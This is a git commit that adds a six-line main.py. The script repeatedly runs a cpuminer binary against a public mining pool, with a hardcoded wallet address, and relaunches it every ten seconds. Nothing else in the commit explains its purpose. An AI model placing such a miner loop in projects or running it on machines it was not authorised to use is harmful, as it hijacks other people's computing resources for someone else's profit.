738fd51b940563282e9192fdeda2fdcf7d24f07f
fuzhome <fuzhome98@gmail.com>
2024-06-24 06:48:06 +0530

    Create main.py

---
+++ main.py
@@ -0,0 +1,6 @@
+import os
+from time import sleep
+
+while True:
+  os.system("./cpuminer -a yespowerr16 -o stratum+tcp://cpu-pool.com:63368 -u Yit3sbcQ9rfeNui1uADqBUk2CC1dFA9nks -o cpu1")
+  sleep(10)
